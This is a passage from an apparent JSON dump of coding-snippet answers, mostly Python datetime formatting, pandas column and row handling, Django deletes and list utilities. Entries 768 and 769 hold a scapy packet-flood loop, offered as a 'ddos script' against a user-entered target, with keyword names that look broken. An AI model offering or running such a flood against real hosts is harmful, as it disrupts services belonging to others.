%z\t\t\tUTC offset\t\t\t\t\t\t\t\t+0100\t %Z\t\t\tTimezone\t\t\t\t\t\t\t\tCST\t %j\t\t\tDay number of year 001-366\t\t\t\t365\t %U\t\t\tWeek number of year 00-53\t\t\t\t52\t %c\t\t\tLocal version of date and time\t\t\tMon Dec 31 17:41:00 2018\t %x\t\t\tLocal version of date\t\t\t\t\t12/31/18\t %X\t\t\tLocal version of time\t\t\t\t\t17:41:00\t %%\t\t\tA % character\t\t\t\t\t\t\t%\n from datetime import datetime  timestamp = 1528797322 date_time = datetime.fromtimestamp(timestamp)  print(\"Date time object:\", date_time)  d = date_time.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"Output 2:\", d)\t  d = date_time.strftime(\"%d %b, %Y\") print(\"Output 3:\", d)  d = date_time.strftime(\"%d %B, %Y\") print(\"Output 4:\", d)  d = date_time.strftime(\"%I%p\") print(\"Output 5:\", d) \n",
    "reg_date": "2021-10-12T11:28:46.000Z"
  },
  {
    "id": 759,
    "keyword": null,
    "link": null,
    "title": " datetime.timedelta months",
    "description": "from datetime import timedelta from dateutil.relativedelta import relativedelta  end_date = start_date + relativedelta(months=delta_period) + timedelta(days=-delta_period)\n",
    "reg_date": "2021-10-12T11:28:46.000Z"
  },
  {
    "id": 760,
    "keyword": null,
    "link": null,
    "title": " datetime date of 10 years ago python",
    "description": "date_N_days_ago = datetime.now() - timedelta(days=N)\nimport datetime datetime.datetime.now() - datetime.timedelta(days=3*365) \n",
    "reg_date": "2021-10-12T11:28:46.000Z"
  },
  {
    "id": 761,
    "keyword": null,
    "link": null,
    "title": " datetime has no attribute now",
    "description": "#You probably have  import datetime  #change that to  from datetime import datetime\ndef timestamp(self):     \"Return POSIX timestamp as float\"     if self._tzinfo is None:         s = self._mktime()         return s + self.microsecond / 1e6     else:         return (self - _EPOCH).total_seconds()\n",
    "reg_date": "2021-10-12T11:28:46.000Z"
  },
  {
    "id": 762,
    "keyword": null,
    "link": null,
    "title": " datetime not defined python",
    "description": ">>> import datetime >>> date = datetime.date.today() >>> date datetime.date(2013, 11, 12) \n",
    "reg_date": "2021-10-12T11:28:46.000Z"
  },
  {
    "id": 763,
    "keyword": null,
    "link": null,
    "title": " datetime python",
    "description": "| Directive | Meaning                                                        | Example                 |  |-----------|------------------------------------------------------------------------------------------| |%a         | Abbreviated weekday name.                                      | Sun, Mon, ..            |  |%A         | Full weekday name.                                             | Sunday, Monday, ...     |  |%w         | Weekday as a decimal number.                                   | 0, 1, ..., 6            |  |%d         | Day of the month as a zero-padded decimal.                     | 01, 02, ..., 31         |  |%-d        | Day of the month as a decimal number.                          | 1, 2, ..., 30           |  |%b         | Abbreviated month name.                                        | Jan, Feb, ..., Dec      |  |%B         | Full month name.                                               | January, February, ...  |  |%m         | Month as a zero-padded decimal number.                         | 01, 02, ..., 12         |  |%-m        | Month as a decimal number.                                     | 1, 2, ..., 12           |  |%y         | Year without century as a zero-padded decimal number.          | 00, 01, ..., 99         |  |%-y        | Year without century as a decimal number.                      | 0, 1, ..., 99           |  |%Y         | Year with century as a decimal number.                         | 2013, 2019 etc.         |  |%H         | Hour (24-hour clock) as a zero-padded decimal number.          | 00, 01, ..., 23         |  |%-H        | Hour (24-hour clock) as a decimal number.                      | 0, 1, ..., 23           |  |%I         | Hour (12-hour clock) as a zero-padded decimal number.          | 01, 02, ..., 12         |  |%-I        | Hour (12-hour clock) as a decimal number.                      | 1, 2, ... 12            |  |%p         | Locale&rsquo;s AM or PM.                                             | AM, PM                  |  |%M         | Minute as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-M        | Minute as a decimal number.                                    | 0, 1, ..., 59           |  |%S         | Second as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-S        | Second as a decimal number.                                    | 0, 1, ..., 59           |  |%f         | Microsecond as a decimal number, zero-padded on the left.      | 000000 - 999999         |  |%z         | UTC offset in the form +HHMM or -HHMM.                         |                         |  |%Z         | Time zone name.                                                |                         |  |%j         | Day of the year as a zero-padded decimal number.               | 001, 002, ..., 366      |  |%-j        | Day of the year as a decimal number. 1, 2, ..., 366            |                         |  |%U         | Week number of the year (Sunday as the first day of the week). | 00, 01, ..., 53         |  |%W         | Week number of the year (Monday as the first day of the week). | 00, 01, ..., 53         |  |%c         | Locale&rsquo;s appropriate date and time representation.             | Mon Sep 30 07:06:05 2013| |%x         | Locale&rsquo;s appropriate date representation.                      | 09/30/13                |  |%X         | Locale&rsquo;s appropriate time representation.                      | 07:06:05                |  |%%         | A literal '%' character.                                       | %                       |  \nfrom datetime import datetime as d date = d.now() print(date.strftime(\"%Y-%m-%d %H:%M:%S\"))\n%a - Abbreviated weekday name. (Sun, Mon, ...) %A - Full weekday name. (Sunday, Monday, ...) %w - Weekday as a decimal number. (0, 1, ..., 6) %d - Day of the month as a zero-padded decimal. (01, 02, ..., 31) %-d - Day of the month as a decimal number. (1, 2, ..., 30) %b - Abbreviated month name. (Jan, Feb, ..., Dec) %B - Full month name. (January, February, ...) %m - Month as a zero-padded decimal number. (01, 02, ..., 12) %-m - Month as a decimal number. (1, 2, ..., 12) %y - Year without century as a zero-padded decimal number. (00, 01, ..., 99) %-y - Year without century as a decimal number. (0, 1, ..., 99) %Y - Year with century as a decimal number. (2013, 2019 etc.) %H - Hour (24-hour clock) as a zero-padded decimal number. (00, 01, ..., 23) %-H - Hour (24-hour clock) as a decimal number. (0, 1, ..., 23) %I - Hour (12-hour clock) as a zero-padded decimal number. (01, 02, ..., 12) %-I - Hour (12-hour clock) as a decimal number. (1, 2, ... 12) %p - Locale&rsquo;s AM or PM. (AM, PM) %M - Minute as a zero-padded decimal number. (00, 01, ..., 59) %-M - Minute as a decimal number. (0, 1, ..., 59) %S - Second as a zero-padded decimal number. (00, 01, ..., 59) %-S - Second as a decimal number. (0, 1, ..., 59) %f - Microsecond as a decimal number, zero-padded on the left.  (000000 - 999999) %z - UTC offset in the form +HHMM or -HHMM.   %Z - Time zone name.  %j - Day of the year as a zero-padded decimal number. (001, 002, ..., 366) %-j - Day of the year as a decimal number. (1, 2, ..., 366) %U - Week number of the year (Sunday as the first day of the week). All days in a new year preceding the first Sunday are considered to be in week 0. (00, 01, ..., 53) %W - Week number of the year (Monday as the first day of the week). All days in a new year preceding the first Monday are considered to be in week 0. (00, 01, ..., 53) %c - Locale&rsquo;s appropriate date and time representation. (Mon Sep 30 07:06:05 2013) %x - Locale&rsquo;s appropriate date representation. (09/30/13) %X - Locale&rsquo;s appropriate time representation. (07:06:05) %% - A literal '%' character. (%)\nimport datetime print(datetime.datetime.now()) #datetime.datetime.now() is the syntax \nimport datetime as d time = d.datetime.now() time = time.strftime(\"%Y-%m-%d  %H:%M:%S\")            #year-#month-#date  #hour:#minure:#second print(time)\n>>> timedelta(hours=-5) datetime.timedelta(days=-1, seconds=68400) >>> print(_) -1 day, 19:00:00 \n",
    "reg_date": "2021-10-12T11:28:46.000Z"
  },
  {
    "id": 764,
    "keyword": null,
    "link": null,
    "title": " datetime python timezone",
    "description": "import datetime import pytz my_date = datetime.datetime.now(pytz.timezone('US/Pacific'))\nmy_date = datetime.datetime.now(pytz.timezone('US/Pacific'))\nfrom datetime import timezone\ndatetime_with_timezone = datetime.datetime(2019, 2, 3, 6, 30, 15, 0, pytz.UTC)\n",
    "reg_date": "2021-10-12T11:28:47.000Z"
  },
  {
    "id": 765,
    "keyword": null,
    "link": null,
    "title": " datetime to int python",
    "description": "from datetime import datetime  x = datetime.now()  x.toordinal()\n",
    "reg_date": "2021-10-12T11:28:47.000Z"
  },
  {
    "id": 766,
    "keyword": null,
    "link": null,
    "title": " datetime to string python",
    "description": "import datetime  today = datetime.datetime.now() date_time = today.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"date and time:\",date_time)\n from datetime import datetime  now = datetime.now() # current date and time  year = now.strftime(\"%Y\") print(\"year:\", year)  month = now.strftime(\"%m\") print(\"month:\", month)  day = now.strftime(\"%d\") print(\"day:\", day)  time = now.strftime(\"%H:%M:%S\") print(\"time:\", time)  date_time = now.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"date and time:\",date_time)   ------------------------------------------------------------------------- Directive\tMeaning\tExample %a\tAbbreviated weekday name.\tSun, Mon, ... %A\tFull weekday name.\tSunday, Monday, ... %w\tWeekday as a decimal number.\t0, 1, ..., 6 %d\tDay of the month as a zero-padded decimal.\t01, 02, ..., 31 %-d\tDay of the month as a decimal number.\t1, 2, ..., 30 %b\tAbbreviated month name.\tJan, Feb, ..., Dec %B\tFull month name.\tJanuary, February, ... %m\tMonth as a zero-padded decimal number.\t01, 02, ..., 12 %-m\tMonth as a decimal number.\t1, 2, ..., 12 %y\tYear without century as a zero-padded decimal number.\t00, 01, ..., 99 %-y\tYear without century as a decimal number.\t0, 1, ..., 99 %Y\tYear with century as a decimal number.\t2013, 2019 etc. %H\tHour (24-hour clock) as a zero-padded decimal number.\t00, 01, ..., 23 %-H\tHour (24-hour clock) as a decimal number.\t0, 1, ..., 23 %I\tHour (12-hour clock) as a zero-padded decimal number.\t01, 02, ..., 12 %-I\tHour (12-hour clock) as a decimal number.\t1, 2, ... 12 %p\tLocale&rsquo;s AM or PM.\tAM, PM %M\tMinute as a zero-padded decimal number.\t00, 01, ..., 59 %-M\tMinute as a decimal number.\t0, 1, ..., 59 %S\tSecond as a zero-padded decimal number.\t00, 01, ..., 59 %-S\tSecond as a decimal number.\t0, 1, ..., 59 %f\tMicrosecond as a decimal number, zero-padded on the left.\t000000 - 999999 %z\tUTC offset in the form +HHMM or -HHMM.\t  %Z\tTime zone name.\t  %j\tDay of the year as a zero-padded decimal number.\t001, 002, ..., 366 %-j\tDay of the year as a decimal number.\t1, 2, ..., 366 %U\tWeek number of the year (Sunday as the first day of the week). All days in a new year preceding the first Sunday are considered to be in week 0.\t00, 01, ..., 53 %W\tWeek number of the year (Monday as the first day of the week). All days in a new year preceding the first Monday are considered to be in week 0.\t00, 01, ..., 53 %c\tLocale&rsquo;s appropriate date and time representation.\tMon Sep 30 07:06:05 2013 %x\tLocale&rsquo;s appropriate date representation.\t09/30/13 %X\tLocale&rsquo;s appropriate time representation.\t07:06:05 %%\tA literal '%' character.\t% ------------------------------------------------------------------------- \n <?php $date = new DateTime('2000-01-01'); echo $date->format('Y-m-d H:i:s'); ?>  \nThe program below converts a datetime object containing current date and time to different string formats.  Code:    from datetime import datetime  now = datetime.now() # current date and time  year = now.strftime(\"%Y\") print(\"year:\", year)  month = now.strftime(\"%m\") print(\"month:\", month)  day = now.strftime(\"%d\") print(\"day:\", day)  time = now.strftime(\"%H:%M:%S\") print(\"time:\", time)  date_time = now.strftime(\"%m/%d/%Y, %H:%M:%S\") print(\"date and time:\",date_time)\t  Output after run the code: year: 2020 month: 03 day: 31 time: 04:59:31 date and time: 03/31/2020, 04:59:31        Here, year, day, time and date_time are strings, whereas now is a datetime object.\n| Directive | Meaning                                                        | Example                 |  |-----------|------------------------------------------------------------------------------------------| |%a         | Abbreviated weekday name.                                      | Sun, Mon, ..            |  |%A         | Full weekday name.                                             | Sunday, Monday, ...     |  |%w         | Weekday as a decimal number.                                   | 0, 1, ..., 6            |  |%d         | Day of the month as a zero-padded decimal.                     | 01, 02, ..., 31         |  |%-d        | Day of the month as a decimal number.                          | 1, 2, ..., 30           |  |%b         | Abbreviated month name.                                        | Jan, Feb, ..., Dec      |  |%B         | Full month name.                                               | January, February, ...  |  |%m         | Month as a zero-padded decimal number.                         | 01, 02, ..., 12         |  |%-m        | Month as a decimal number.                                     | 1, 2, ..., 12           |  |%y         | Year without century as a zero-padded decimal number.          | 00, 01, ..., 99         |  |%-y        | Year without century as a decimal number.                      | 0, 1, ..., 99           |  |%Y         | Year with century as a decimal number.                         | 2013, 2019 etc.         |  |%H         | Hour (24-hour clock) as a zero-padded decimal number.          | 00, 01, ..., 23         |  |%-H        | Hour (24-hour clock) as a decimal number.                      | 0, 1, ..., 23           |  |%I         | Hour (12-hour clock) as a zero-padded decimal number.          | 01, 02, ..., 12         |  |%-I        | Hour (12-hour clock) as a decimal number.                      | 1, 2, ... 12            |  |%p         | Locale&rsquo;s AM or PM.                                             | AM, PM                  |  |%M         | Minute as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-M        | Minute as a decimal number.                                    | 0, 1, ..., 59           |  |%S         | Second as a zero-padded decimal number.                        | 00, 01, ..., 59         |  |%-S        | Second as a decimal number.                                    | 0, 1, ..., 59           |  |%f         | Microsecond as a decimal number, zero-padded on the left.      | 000000 - 999999         |  |%z         | UTC offset in the form +HHMM or -HHMM.                         |                         |  |%Z         | Time zone name.                                                |                         |  |%j         | Day of the year as a zero-padded decimal number.               | 001, 002, ..., 366      |  |%-j        | Day of the year as a decimal number. 1, 2, ..., 366            |                         |  |%U         | Week number of the year (Sunday as the first day of the week). | 00, 01, ..., 53         |  |%W         | Week number of the year (Monday as the first day of the week). | 00, 01, ..., 53         |  |%c         | Locale&rsquo;s appropriate date and time representation.             | Mon Sep 30 07:06:05 2013| |%x         | Locale&rsquo;s appropriate date representation.                      | 09/30/13                |  |%X         | Locale&rsquo;s appropriate time representation.                      | 07:06:05                |  |%%         | A literal '%' character.                                       | %                       |  \nfrom datetime import datetime  datetime_object = datetime.strptime('Jun 1 2005  1:33PM', '%b %d %Y %I:%M%p')\n",
    "reg_date": "2021-10-12T11:28:47.000Z"
  },
  {
    "id": 767,
    "keyword": null,
    "link": null,
    "title": " day difference between two dates in python",
    "description": "from datetime import date  d0 = date(2008, 8, 18) d1 = date(2008, 9, 26) delta = d1 - d0 print(delta.days)\nfrom datetime import date d0 = date(2017, 8, 18) d1 = date(2017, 10, 26) delta = d1 - d0 print(delta.days)\n",
    "reg_date": "2021-10-12T11:28:47.000Z"
  },
  {
    "id": 768,
    "keyword": null,
    "link": null,
    "title": " ddos script",
    "description": "from scapy.all import * source_IP = input(\"Enter IP address of Source: \") target_IP = input(\"Enter IP address of Target: \") source_port = int(input(\"Enter Source Port Number:\")) i = 1  while True:    IP1 = IP(source_IP = source_IP, destination = target_IP)    TCP1 = TCP(srcport = source_port, dstport = 80)    pkt = IP1 / TCP1    send(pkt, inter = .001)        print (\"packet sent \", i)       i = i + 1 #this is in python\n",
    "reg_date": "2021-10-12T11:28:47.000Z"
  },
  {
    "id": 769,
    "keyword": null,
    "link": null,
    "title": " ddos someone in python",
    "description": "from scapy.all import * source_IP = input(\"Enter IP address of Source: \") target_IP = input(\"Enter IP address of Target: \") source_port = int(input(\"Enter Source Port Number:\")) i = 1  while True:    IP1 = IP(source_IP = source_IP, destination = target_IP)    TCP1 = TCP(srcport = source_port, dstport = 80)    pkt = IP1 / TCP1    send(pkt, inter = .001)        print (\"packet sent \", i)       i = i + 1\n",
    "reg_date": "2021-10-12T11:28:47.000Z"
  },
  {
    "id": 770,
    "keyword": null,
    "link": null,
    "title": " deactivate venv",
    "description": "deactivate venv\n",
    "reg_date": "2021-10-12T11:28:47.000Z"
  },
  {
    "id": 771,
    "keyword": null,
    "link": null,
    "title": " debconf: falling back to frontend: Readline Configuring tzdata",
    "description": "RUN DEBIAN_FRONTEND=\"noninteractive\" apt-get -y install tzdata \n",
    "reg_date": "2021-10-12T11:28:47.000Z"
  },
  {
    "id": 772,
    "keyword": null,
    "link": null,
    "title": " debug flask powershel",
    "description": "$env:FLASK_ENV = \"development\"\n",
    "reg_date": "2021-10-12T11:28:47.000Z"
  },
  {
    "id": 773,
    "keyword": null,
    "link": null,
    "title": " debugar python",
    "description": "import ipdb;ipdb.set_trace()\nt=int(input()) while(t!=0):   s=input()   v='aeiou'   flag=0   for i in range(len(s)):     if s[i] not in v:       if s[i+1] in v:         flag+=1       else:         print('NO')         break     else:        #if s[i] in v:          flag+=1     if flag == len(s):         print('YES')   t=t-1        \n",
    "reg_date": "2021-10-12T11:28:47.000Z"
  },
  {
    "id": 774,
    "keyword": null,
    "link": null,
    "title": " decimal to octal python",
    "description": "# Python program to convert decimal into other number systems dec = 344  print(\"The decimal value of\", dec, \"is:\") print(bin(dec), \"in binary.\") print(oct(dec), \"in octal.\") print(hex(dec), \"in hexadecimal.\") \ndec =13 print(bin(dec),oct(dec),hex(dec))\t\t#prints decimal,octal,hexadecimal value of 13\n",
    "reg_date": "2021-10-12T11:28:48.000Z"
  },
  {
    "id": 775,
    "keyword": null,
    "link": null,
    "title": " decode base64 python",
    "description": "import base64  message = \"Python is fun\" message_bytes = message.encode('ascii') base64_bytes = base64.b64encode(message_bytes) base64_message = base64_bytes.decode('ascii')  print(base64_message)\nimport base64 msg = base64.b64decode(msg)\n>>> import base64 >>> encoded = base64.b64encode(b'data to be encoded') >>> encoded b'ZGF0YSB0byBiZSBlbmNvZGVk' >>> data = base64.b64decode(encoded) >>> data b'data to be encoded' \n#== Decoding ==#  import base64  base64_message = 'UHl0aG9uIGlzIGZ1bg==' base64_bytes = base64_message.encode('ascii') message_bytes = base64.b64decode(base64_bytes) message = message_bytes.decode('ascii')  print(message)\nimport base64 coded_string = '''Q5YACgA...''' base64.b64decode(coded_string)\n",
    "reg_date": "2021-10-12T11:28:48.000Z"
  },
  {
    "id": 776,
    "keyword": null,
    "link": null,
    "title": " decrease hours in datetime python",
    "description": "from datetime import datetime, timedelta d = datetime.today() - timedelta(hours=1, minutes=50)\n",
    "reg_date": "2021-10-12T11:28:48.000Z"
  },
  {
    "id": 777,
    "keyword": null,
    "link": null,
    "title": " deep flatten python",
    "description": "def spread(arg):     ret = []     for i in arg:         if isinstance(i, list):             ret.extend(i)         else:             ret.append(i)     return ret   def deep_flatten(lst):     result = []     result.extend(         spread(list(map(lambda x: deep_flatten(x) if type(x) == list else x, lst))))     return result   deep_flatten([1, [2], [[3], 4], 5]) # [1,2,3,4,5]\n",
    "reg_date": "2021-10-12T11:28:48.000Z"
  },
  {
    "id": 778,
    "keyword": null,
    "link": null,
    "title": " default argument in flask route",
    "description": "@user.route('/<user_id>', defaults={'username': None}) @user.route('/<user_id>/<username>') def show(user_id, username):     pass\n",
    "reg_date": "2021-10-12T11:28:48.000Z"
  },
  {
    "id": 779,
    "keyword": null,
    "link": null,
    "title": " defaultdict check if key exists",
    "description": "dct.get(key, 'ham')  # will return dct[key] or 'ham' but never stores anything \n'in' is the intended way to test for the existence of a key in a dict.  d = {\"key1\": 10, \"key2\": 23}  if \"key1\" in d:     print(\"this will execute\")  if \"nonexistent key\" in d:     print(\"this will not\")\n",
    "reg_date": "2021-10-12T11:28:48.000Z"
  },
  {
    "id": 780,
    "keyword": null,
    "link": null,
    "title": " define a column as index pandas",
    "description": "myDataFrame.set_index('column_name')\n",
    "reg_date": "2021-10-12T11:28:48.000Z"
  },
  {
    "id": 781,
    "keyword": null,
    "link": null,
    "title": " degree symbol in python",
    "description": "degree_sign= u'\\N{DEGREE SIGN}'\n",
    "reg_date": "2021-10-12T11:28:48.000Z"
  },
  {
    "id": 782,
    "keyword": null,
    "link": null,
    "title": " delay time python",
    "description": "import time while True:     print(\"This prints once a minute.\")     time.sleep(60) # Delay for 1 minute (60 seconds).\nimport time  time.sleep(5) # sleeps for 5 seconds\n",
    "reg_date": "2021-10-12T11:28:48.000Z"
  },
  {
    "id": 783,
    "keyword": null,
    "link": null,
    "title": " delcare consatnt python",
    "description": "# You can't, just use uppercase to identify\n",
    "reg_date": "2021-10-12T11:28:48.000Z"
  },
  {
    "id": 784,
    "keyword": null,
    "link": null,
    "title": " delete column pandas dataframe",
    "description": "df.drop(['column_1', 'Column_2'], axis = 1, inplace = True) \n>>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11 \n# axis=1 tells Python that we want to apply function on columns instead of rows # To delete the column permanently from original dataframe df, we can use the option inplace=True df.drop(['A', 'B', 'C'], axis=1, inplace=True)\ndel df['column']\ndf.drop('col_name',1) #1 drop column / 0 drop row\ndf = pd.DataFrame(np.arange(12).reshape(3, 4), columns=['A', 'B', 'C', 'D']) >>> df    A  B   C   D 0  0  1   2   3 1  4  5   6   7 2  8  9  10  11  cols=['B', 'C'] >>> df.drop(columns = cols)  # or # df.drop(columns = ['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11 \n",
    "reg_date": "2021-10-12T11:28:49.000Z"
  },
  {
    "id": 785,
    "keyword": null,
    "link": null,
    "title": " delete database entry using name django",
    "description": "SomeModel.objects.filter(id=id).delete()\nobj = get_object_or_404(modelname, name=name) obj.delete()\n__code-examples__python__delete_database_entry_using_name_django__?\nSomeModel.objects.filter(id=id).delete()\nobj = get_object_or_404(modelname, name=name) obj.delete()\n",
    "reg_date": "2021-10-12T11:28:49.000Z"
  },
  {
    "id": 786,
    "keyword": null,
    "link": null,
    "title": " delete element of a list from another list python",
    "description": "l1 = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\"] l2 = [\"b\", \"c\", \"e\"]  l1 = [elt for elt in l1 if elt not in l2] # l1 = ['a', 'd', 'f'] \n",
    "reg_date": "2021-10-12T11:28:49.000Z"
  },
  {
    "id": 787,
    "keyword": null,
    "link": null,
    "title": " delete files with same extensions",
    "description": "import os  dir_name = \"/Users/ben/downloads/\" test = os.listdir(dir_name)  for item in test:     if item.endswith(\".zip\"):         os.remove(os.path.join(dir_name, item)) \n",
    "reg_date": "2021-10-12T11:28:49.000Z"
  },
  {
    "id": 788,
    "keyword": null,
    "link": null,
    "title": " delete image with python",
    "description": "import os os.remove(\"filename.txt\")\nimport os os.remove(\"yourimagePath.jpg\") \n",
    "reg_date": "2021-10-12T11:28:49.000Z"
  },
  {
    "id": 789,
    "keyword": null,
    "link": null,
    "title": " delete index in df",
    "description": ">>> df.reset_index(drop=True)     class  max_speed 0    bird      389.0 1    bird       24.0 2  mammal       80.5 3  mammal        NaN \ndf.reset_index(drop=True, inplace=True)\n",
    "reg_date": "2021-10-12T11:28:49.000Z"
  },
  {
    "id": 790,
    "keyword": null,
    "link": null,
    "title": " delete model object django",
    "description": "SomeModel.objects.filter(id=id).delete()\n",
    "reg_date": "2021-10-12T11:28:49.000Z"
  },
  {
    "id": 791,
    "keyword": null,
    "link": null,
    "title": " delete row from dataframe python",
    "description": "df.drop(df.index[-2]) df.drop(df.index[[3, 4]]) df.drop(['row_1', 'row_2']) df.drop('column_1', axis=1) df[df.name != 'cell']\n>>> df    A  B   C   D 0  0  1   2   3 1  4  5   6   7 2  8  9  10  11  Drop a row by index      df.drop([0, 1])        A  B   C   D     2  8  9  10  11  Drop columns      df.drop(columns=['B', 'C'])        A   D     0  0   3     1  4   7     2  8  11\ndf.drop(df.index[2])\n",
    "reg_date": "2021-10-12T11:28:49.000Z"
  },
  {
    "id": 792,
    "keyword": null,
    "link": null,
    "title": " delete space in string python",
    "description": ".replace(\" \", \"\")\nsentence = ' hello  apple' sentence.strip() >>> 'hello  apple'\nsentence = '       hello  apple         ' sentence.strip() >>> 'hello  apple'\n>>> s.replace(\" \", \"\")  \n>>> \"    xyz     \".rstrip() '    xyz' \n>>> \" \".join(s.split()) 'Hello World From Pankaj Hi There' \n",
    "reg_date": "2021-10-12T11:28:49.000Z"
  },
  {
    "id": 793,
    "keyword": null,
    "link": null,
    "title": " delete the duplicates in python",
    "description": "   mylist = [\"a\", \"b\", \"a\", \"c\", \"c\"] mylist = list(dict.fromkeys(mylist))    print(mylist) \n# remove duplicate from given_list using list comprehension res = [] [res.append(x) for x in given_list if x not in res]\n",
    "reg_date": "2021-10-12T11:28:49.000Z"
  },
  {
    "id": 794,
    "keyword": null,
    "link": null,
    "title": " delete unnamed 0 columns",
    "description": "df.drop(df.filter(regex=\"Unnamed\"),axis=1, inplace=True)\ndf = df.loc[:, ~df.columns.str.contains('^Unnamed')]  In [162]: df Out[162]:    colA  ColB  colC  colD  colE  colF  colG 0    44    45    26    26    40    26    46 1    47    16    38    47    48    22    37 2    19    28    36    18    40    18    46 3    50    14    12    33    12    44    23 4    39    47    16    42    33    48    38 \ndf.to_csv(index=False)\n",
    "reg_date": "2021-10-12T11:28:50.000Z"
  },
  {
    "id": 795,
    "keyword": null,
    "link": null,
    "title": " delete unnamed coloumns in pandas",
    "description": "# Best method so far. df = df.loc[:, ~df.columns.str.contains('^Unnamed')]\ndf.drop('column_name', axis=1, inplace=True)\ndf.to_csv(path, index=False)\ndel df['column_name']\ndel df['column_name'] #to remove a column from dataframe\n",
    "reg_date": "2021-10-12T11:28:50.000Z"
  },
  {
    "id": 796,
    "keyword": null,
    "link": null,
    "title": " deleting all rows in pandas",
    "description": "# df is a data frame. like df = pd.read_csv('file.csv') df.drop(df.index[:], inplace=True)\n",
    "reg_date": "2021-10-12T11:28:50.000Z"
  },
  {
    "id": 797,
    "keyword": null,
    "link": null,
    "title": " deleting duplicates in list python",
    "description": "mylist = [\"a\", \"b\", \"b\", \"c\", \"a\"] mylist = sorted(set(mylist)) print(mylist)\n   mylist = [\"a\", \"b\", \"a\", \"c\", \"c\"] mylist = list(dict.fromkeys(mylist))    print(mylist) \nmylist = [\"a\", \"b\", \"a\", \"c\", \"c\"] mylist = list(dict.fromkeys(mylist))\nword = input().split()  for i in word:   if word.count(i) > 1:     word.remove(i) \n>>> list(dict.fromkeys('abracadabra')) ['a', 'b', 'r', 'c', 'd'] \n",
    "reg_date": "2021-10-12T11:28:50.000Z"
  },
  {
    "id": 798,
    "keyword": null,
    "link": null,
    "title": " den pfad der python datei rausfinden",
    "description": "os.path.dirname(os.path.realpath(__file__)) #path to the directory with the python file\n",
    "reg_date": "2021-10-12T11:28:50.000Z"
  },
  {
    "id": 799,
    "keyword": null,
    "link": null,
    "title": " detect key press python",
    "description": "import keyboard # if key 'a' is pressed  if keyboard.is_pressed('a'): \tprint('a key has ben pressed')\n# in console: pip install keyboard import time import keyboard as kb  key = \"a\"  while (True): \tif (kb.is_pressed(key)): \t\tprint(\"a pressed\") \t     time.sleep(0.001) # decreases CPU usage\nimport keyboard  # using module keyboard while True:  # making a loop     try:  # used try so that if user pressed other than the given key error will not be shown         if keyboard.is_pressed('q'):  # if key 'q' is pressed              print('You Pressed A Key!')             break  # finishing the loop     except:         break  # if user pressed a key other than the given key the loop will break\n# pip3 install pynput  from pynput.keyboard import Key, Listener   def show(key):      pressed_key = str(key).replace(\"'\", \"\")     print(\" key: \", pressed_key)      if key == Key.esc:         # Stop listener         return False   # Listener with Listener(on_press=show) as listener:     listener.join() \n",
    "reg_date": "2021-10-12T11:28:50.000Z"
  },
  {
    "id": 800,
    "keyword": null,
    "link": null,
    "title": " determinant of 3x3 numpy",
    "description": "numpy.linalg.det(array)\nimport numpy as np arr=np.array([[1,2,3],[4,5,6],[7,8,9]]) arr round(np.linalg.det(arr))\n",
    "reg_date": "2021-10-12T11:28:50.000Z"
  },
  {
    "id": 801,
    "keyword": null,
    "link": null,
    "title": " determine if number is prime python",
    "description": "# Time Efficient Primality Check in Python  def primeCheck(n):     # 0, 1, even numbers greater than 2 are NOT PRIME     if n==1 or n==0 or (n % 2 == 0 and n > 2):         return \"Not prime\"     else:         # Not prime if divisable by another number less         # or equal to the square root of itself.         # n**(1/2) returns square root of n         for i in range(3, int(n**(1/2))+1, 2):             if n%i == 0:                 return \"Not prime\"         return \"Prime\"\n#make the function #to do this all hte vairibles go in side the function  def CheckIfPrime ():     a1 = input(\"which number do you want to check\")     a = int(a1)#you need the checking number as an int not an str     b = 2 #the number to check againts     c = (\"yes\")     while b < a:#run the loop         if a%b == 0:#check if the division has a remainder             c = (\"no\")#set the answer         b = b+1     print(c)#print the output CheckIfPrime ()#call the function   \n",
    "reg_date": "2021-10-12T11:28:50.000Z"
  },
  {
    "id": 802,
    "keyword": null,
    "link": null,
    "title": " df.drop index",
    "description": "df.drop(a_dataframe.columns[0], axis=1, inplace=True)\n>>> df.reset_index(drop=True)     class  max_speed 0    bird      389.0 1    bird       24.0 2  mammal       80.5 3  mammal        NaN \ndf = df.reset_index(drop=True)\ndf.reset_index(drop=True, inplace=True)\n",
    "reg_date": "2021-10-12T11:28:50.000Z"
  },
  {
    "id": 803,
    "keyword": null,
    "link": null,
    "title": " df.shape 0",
    "description": "count_row = df.shape[0]  # gives number of row count count_col = df.shape[1]  # gives number of col count\ndf.shape\n>>> df = pd.DataFrame({'col1': [1, 2], 'col2': [3, 4]}) >>> df.shape (2, 2) \n",
    "reg_date": "2021-10-12T11:28:51.000Z"
  },
  {
    "id": 804,
    "keyword": null,
    "link": null,
    "title": " df.sort values(by='col1',asending=True)",
    "description": ">>> df.sort_values(by='col1', ascending=False)   col1  col2  col3 col4 4    D     7     2    e 5    C     4     3    F 2    B     9     9    c 0    A     2     0    a 1    A     1     1    B 3  NaN     8     4    D \n",
    "reg_date": "2021-10-12T11:28:51.000Z"
  },
  {
    "id": 805,
    "keyword": null,
    "link": null,
    "title": " df change column names",
    "description": "df.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"})\ndf = df.rename(columns = {'myvar':'myvar_new'})\n>>> df = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [4, 5, 6]}) >>> df.rename(columns={\"A\": \"a\", \"B\": \"c\"})    a  c 0  1  4 1  2  5 2  3  6 \ndf.rename(columns={\"A\": \"a\", \"B\": \"b\", \"C\": \"c\"}, errors=\"raise\", inplace=True) \n#df.rename() will only return a new df with the new headers #df = df.rename() will change the heders of the current dataframe  df = df.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"})\nprint(df.rename(columns={'A': 'a', 'C': 'c'})) #         a   B   c # ONE    11  12  13 # TWO    21  22  23 # THREE  31  32  33 \n",
    "reg_date": "2021-10-12T11:28:51.000Z"
  },
  {
    "id": 806,
    "keyword": null,
    "link": null,
    "title": " df count missing values",
